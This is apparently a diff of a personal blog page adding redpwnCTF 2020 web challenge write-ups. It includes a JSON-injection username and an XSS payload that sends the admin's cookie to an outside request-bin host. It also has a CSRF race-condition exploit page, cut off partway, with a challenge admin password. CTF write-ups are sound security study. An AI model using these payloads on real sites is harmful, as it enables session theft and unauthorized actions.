@@ -59,7 +59,304 @@
     </div>
     <div class="main-content text-normal" data-simplebar>
         <div  class="blog-content">
-    <h1>ropes</h1>
+    <h1>pastebin</h1>
+<blockquote>
+<p>I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it <a href="https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin" target="_blank">here</a> <br/>
+  Site: https://static-pastebin.2020.redpwnc.tf <br/>
+  For this challenge I use a very nice <a href="https://xsshunter.com/" target="_blank">tool</a> to solve it, the flag is the admin's cookie <br/>
+  flag : <code>flag{54n1t1z4t10n_k1nd4_h4rd}</code> </p>
+</blockquote>
+<h1>panda-facts</h1>
+<blockquote>
+<p>I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down! <br/>
+  Site: panda-facts.2020.redpwnc.tf <br/>
+  The concept is pretty much the same with any injection vulnerabilities, we can insert <code>name", "member" : 1, "x" : "somethingtomatchthequotationmarks</code> as our username, and it will inject a value of member and set it to 1, then x just to match the quotation marks.</p>
+</blockquote>
+<p>flag : <code>flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}</code></p>
+<h1>static-static-hosting</h1>
+<blockquote>
+<p>This is another xss challenge with a better filter so we have to craft a better payload basically</p>
+</blockquote>
+<p>I struggle really hard on this one because the filter are just really strong, and i come up with a working <code>iframe</code> payload</p>
+<p>But it didn't work, and when i asked the organizer it turns out that the admin site are using chrome to run the payload </p>
+<p>And with the fact that using <code>iframe</code> will create another child element thus creating a situation where we can't take the admin's cookie because of <strong>chrome</strong> (insert chrome jokes here)</p>
+<p>so I came up with another solution</p>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">FRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">"javascript:javascript:alert(document.cookie);"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>It turns out that we can use frame and run js inside of the <code>src</code></p>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">FRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">"javascript:javascript:(function() {</span>
+<span class="s">        var xmlHttp = new XMLHttpRequest();</span>
+<span class="s">        xmlHttp.open('POST', 'https://en8nxg3ahdy8p.x.pipedream.net', false );</span>
+<span class="s">        xmlHttp.send(btoa(document.cookie));</span>
+<span class="s">        return xmlHttp.responseText;   </span>
+<span class="s">    })();"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>So by creating payload like that, it will grab admin's cookie when the admin visit the site and send the cookie to our site in request bin and in this case the flag</p>
+<p>flag = <code>flag{wh0_n33d5_d0mpur1fy}</code></p>
+<h1>anti-textbook</h1>
+<blockquote>
+<p>This is the most interesting challenge from all web challenge i've come up so far in so many ctf's</p>
+</blockquote>
+<p>We are only given this <code>n</code> and <code>e</code></p>
+<pre><code>e: 65537
+n: 23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561
+</code></pre>
+<p>And i that it must be something related to an RSA crypto, <br/>
+looking at the hint : </p>
+<pre><code>It's important for public keys to be transparent.
+
+Hint: certificate-transparency.org
+</code></pre>
+<p>So thanks to @Wrth guess, we might be able to create a certificate from those 2 numbers</p>
+<p>And i come up with this script to convert <code>e</code> and <code>n</code> to a <code>.pem</code> certificate</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric.rsa</span> <span class="kn">import</span> <span class="n">RSAPublicNumbers</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
+
+<span class="n">exponent</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">modulus</span> <span class="o">=</span> <span class="mi">23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561</span>
+<span class="n">numbers</span> <span class="o">=</span> <span class="n">RSAPublicNumbers</span><span class="p">(</span><span class="n">exponent</span><span class="p">,</span> <span class="n">modulus</span><span class="p">)</span>
+<span class="n">public_key</span> <span class="o">=</span> <span class="n">numbers</span><span class="o">.</span><span class="n">public_key</span><span class="p">(</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
+<span class="n">pem</span> <span class="o">=</span> <span class="n">public_key</span><span class="o">.</span><span class="n">public_bytes</span><span class="p">(</span>
+    <span class="n">encoding</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">PEM</span><span class="p">,</span>
+    <span class="nb">format</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">PublicFormat</span><span class="o">.</span><span class="n">SubjectPublicKeyInfo</span>
+<span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">pem</span><span class="p">)</span>
+</code></pre></div>
+<p>And we got a <code>.pem</code> certificate :</p>
+<pre><code>-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuffuWhYrpTW8cdcAWUwe
+T8oZYCp/8pKPYj4eZ3pd7mhYoCkSSeqZ5e+L33O38SoMANogM1NBayYlumOcPxC/
+C9PHMF6AlaLDH+yX/Fg+a055m0O7+5pJNUVuRn9z7aYhhubnRyjk2cVTHLmOHqK9
+FPM1QBBdouddMgZYE6plaBdBIMwQ8txuZQs6t862zJfA0/cgT47TtiTNkouHkAuT
+VXBPcbM5pXIu7MoflJrUjQ0ljuOIFgXQ7wCFusXrIpvuVpqLzRvTD69GA7Cj0Dt9
+ij7KPrBFM2jFyR8vnm5w+T6sGafXgJEEj0sLmbIReWcNeyHC2Tl9OniyMEqPeLsZ
+oQIDAQAB
+-----END PUBLIC KEY-----
+</code></pre>
+<p>We can convert this certificate to sha256 hash and then search for related sha256 certificate in <a href="https://censys.io/" target="_blank">https://censys.io/</a></p>
+<p>I use this openssl script to convert <code>.pem</code> to sha256 hash</p>
+<div class="codehilite"><pre><span></span><code>openssl rsa -in pubkey.pem -pubin -outform der <span class="p">|</span> openssl dgst -sha256
+</code></pre></div>
+<p>find the related site with that sha256 certificate this way <br/>
+https://censys.io/certificates?q=9db105389dd81cfb4b59ff1a4c0670c630b1800e542323111d5c5cb9af72031f</p>
+<p>And we got a website that has the flag inside</p>
+<p>flag = <code>flag{c3rTific4t3_7r4n5pArAncY_fTw}</code></p>
+<h1>cookie-recipes-v2</h1>
+<blockquote>
+<p>I'm really proud that i can complete this challenge because its 'kinda' something new to me</p>
+</blockquote>
+<p>So we are given a site with a persistent cookie (that also works as csrf) and the important thing is that every process will just rely on that static csrf cookie so it must be a csrf attack, but by reviewing the code</p>
+<p>I see some interesting things happens when we want the admin to give a <code>gift</code> to our account, there is this TOC-TOU vulnerability leading us to racing condition attack</p>
+<p>So in summary its a combination between csrf and race condition attack</p>
+<p>The plan here are</p>
+<pre><code>1. Create a malicious site with very-finely(i tried hard so much on this) crafted exploit inside
+2. Create a link to the site using awesome php+ngrok combo
+3. Let the admin visit the site and do that csrf+race_condition attack for us
+</code></pre>
+<p>Here's my exploit code</p>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="c">&lt;!-- admin pass = n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn --&gt;</span>
+    <span class="c">&lt;!-- remote url = https://cookie-recipes-v2.2020.redpwnc.tf --&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse1'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
